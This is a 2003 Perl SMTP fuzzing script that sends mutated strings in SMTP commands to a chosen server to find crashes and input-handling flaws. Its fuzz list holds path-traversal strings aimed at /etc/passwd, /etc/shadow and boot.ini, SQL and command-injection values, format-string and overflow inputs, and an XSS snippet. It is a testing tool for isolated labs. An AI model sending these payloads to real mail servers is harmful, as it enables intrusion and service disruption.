#!/usr/bin/perl 
#
# smtpfuzz - small perl script to send some funny strings to 
# SMTP servers
#
# Frank Berger, 08. Nov. 2003
# License: GPL v 2.0  http://www.gnu.org/copyleft/gpl.html
#
# Please note:
# my perl script uses fuzzing strings researched by
# Dave Aitel (Immunity, Inc.) http://www.immunitysec.com/
# check out SpikeProxy and Spike both use this fuzzing
# strings as well. 
# I wrote this script because I don't know C very well,
# so I decided on this quick hack.
#


use IO::Socket;
my ($host, $port, $kidpid, $handle, $line);

# ATTENTION!!!
# please make sure that you do not forward mails to outside
# internet servers! you may want to disconnect your test lab
# from outgoing internet connections during fuzzing! And clean
# up the mail queues before going back online!
#
# array of strings with valid values for SMTP
# From: foo@a.de
# To: TO@b.de
# Body: sometext
#                                                                                
@mastervar = ('w0001.berger.com','foo','example.com','frank','berger.com','sometext');

unless (@ARGV == 2) { die "usage: $0 host port" }
($host, $port) = @ARGV;

#
# generates an stack of strings which are used for fuzzing
#
sub generate {
  $master = shift; # we will use this value for mutations, like "foo", "foo;", "foo'"...
#  @fuzz_stack = ();
  push @fuzz_stack, shift;

  # lets start with mutations
  push @fuzz_stack, $master."'";
  push @fuzz_stack, $master."\"";
  push @fuzz_stack, $master.";";
  push @fuzz_stack, "(".$master.")";

  # values found in SpikeProxy from http://www.immunitysec.com/

#---
  my @fuzzcharacters = ("A","1","\"",".","<","%","%n");
  my $maxchars=5000;
  foreach my $fchar (@fuzzcharacters) {
    my $i=1;
    while( $i < ($maxchars/length($fchar)) ) {
      #a small selection of fuzz characters
      push @fuzz_stack, ($fchar x $i);
      push @fuzz_stack, $fchar x ($i-1);
      push @fuzz_stack, $fchar x ($i+1);
      push @fuzz_stack, $fchar x ($i+1024);
      $i *= 2;
    }
  }

  push @fuzz_stack, "../../../../../../../../../../../../etc/hosts%00";
  push @fuzz_stack, "../../../../../../../../../../../../etc/hosts";
  push @fuzz_stack, "../../../../../../../../../../../../etc/passwd%00";
  push @fuzz_stack, "../../../../../../../../../../../../etc/passwd";
  push @fuzz_stack, "../../../../../../../../../../../../etc/shadow%00";
  push @fuzz_stack, "../../../../../../../../../../../../etc/shadow";
  push @fuzz_stack, "../../../../../../../../../../../../boot.ini%00";
  push @fuzz_stack, "../../../../../../../../../../../../boot.ini";
  push @fuzz_stack, "../../../../../../../../../../../../localstart.asp%00";
  push @fuzz_stack, "../../../../../../../../../../../../localstart.asp";
  push @fuzz_stack, "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00";
  push @fuzz_stack, "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%255cboot.ini";
  push @fuzz_stack, "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00";
  push @fuzz_stack, "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini";

  push @fuzz_stack, "65536";
  push @fuzz_stack, "0xfffffff";
  push @fuzz_stack, "268435455";
  push @fuzz_stack, "1";
  push @fuzz_stack, "\0";   # hehe, something wrong with this one in perl !? :-(
  push @fuzz_stack, "-1";
  push @fuzz_stack, "-268435455";
  push @fuzz_stack, "-20";
  push @fuzz_stack, "1;SELECT%20*";
  push @fuzz_stack, "'sqlattempt1";
  push @fuzz_stack, "(sqlattempt2)";
  push @fuzz_stack, "OR%201=1";
  push @fuzz_stack, ";read;";
  push @fuzz_stack, ";netstat -a;";
  #postnuke issue - just a backslash
  push @fuzz_stack, "\\";
  push @fuzz_stack, "%5c";
  #backslash then forwardslash
  push @fuzz_stack, "\\/";
  push @fuzz_stack, "%5c/";
  #causes all sorts of problems
  push @fuzz_stack, "\nnetstat -a%\n";
  push @fuzz_stack, "\"hihihi";
                                                                                                            
  push @fuzz_stack, "|dir";
  push @fuzz_stack, "|ls";
  push @fuzz_stack, "|/bin/ls -al";
  push @fuzz_stack, "\n/bin/ls -al\n";
  push @fuzz_stack, "+%00";
  push @fuzz_stack, "%20$(sleep%2050)";
  push @fuzz_stack, "%20'sleep%2050'";
  push @fuzz_stack, "!@#$%%^#$%#$@#$%$$@#$%^^**(()";
  push @fuzz_stack, "%01%02%03%04%0a%0d%0aADSF";
  push @fuzz_stack, "Bob's%20Foot";
  push @fuzz_stack, "<xss>alert('XSS')</vulnerable>";
#---
}

#
# open the TCP connection (copy n paste is great! :-)
#
sub fuzz_connect {
  # create a tcp connection to the specified host and port
  $handle = IO::Socket::INET->new(Proto     => "tcp",
                                  PeerAddr  => $host,
                                  PeerPort  => $port)
    or die "can't connect to port $port on $host: $!";
                                                                                
  $handle->autoflush(1);              # so output gets there right away
  print STDERR "[Connected to $host:$port]\n";
}

#
# read the response... when the remote server is not responding we
# should run into the timeout, but I haven't checked the timeout
# function... (just copy n paste again :-)
#
sub read_response {
  eval {
    local $SIG{ALRM} = sub { die "alarm\n" }; # NB: \n required
    alarm 10;

    $line = readline($handle);
    
    alarm 0;
  };
  if ($@) {
    die unless $@ eq "alarm\n";   # propagate unexpected errors
    	# timed out
  }
  else {
    	# didn't
  }
}

#
# validate the response line and against an given status code
#
sub validate_response {
  my $status = shift;
  if($line =~ /^$status/) { print("OK: ".$line); }
    else { print("SMTP error\n"); return 0; };
}

#
# a sequence of one SMTP chat (sending one mail)
#
sub fuzzer_run {
  print "-------------->\n";
  foreach $item (@_) {
      print $item . ",";
  }
  print "\n";

  fuzz_connect();

  read_response();
  if(!validate_response("220")) { return 0; }

  print $handle 'HELO ' . shift() . "\n";
  read_response();
  if(!validate_response("250")) { return 0; }
                                                                                
  print $handle 'MAIL FROM:<' . shift() . '@' . shift() . ">\n";
  read_response();
  if(!validate_response("250")) { return 0; }

  print $handle 'RCPT TO:<' . shift() . '@' . shift() . ">\n";
  read_response();
  if(!validate_response("250")) { return 0; }

  print $handle "data\n";
  read_response();
  if(!validate_response("354")) { return 0; }

  print $handle shift() . "\n";
  print $handle ".\n";
  read_response();
  if(!validate_response("250")) { return 0; }

  print $handle "QUIT\n";
}

#
# the main loop
#

for(my $j=0; $j<@mastervar; $j++) {
  if(!$j) {
    generate($mastervar[$j],$mastervar[$j]);
  }
  else {
    generate($mastervar[$j]);
  }

  while($fuzz = pop @fuzz_stack) {
    @myvar = @mastervar;
    $myvar[$j] = $fuzz;
#    print $fuzz . "\n";
#  foreach $item (@myvar) {
#      print $item . ",";
#  }
#  print "\n";
    fuzzer_run(@myvar);
  }
  print "---\n";
}
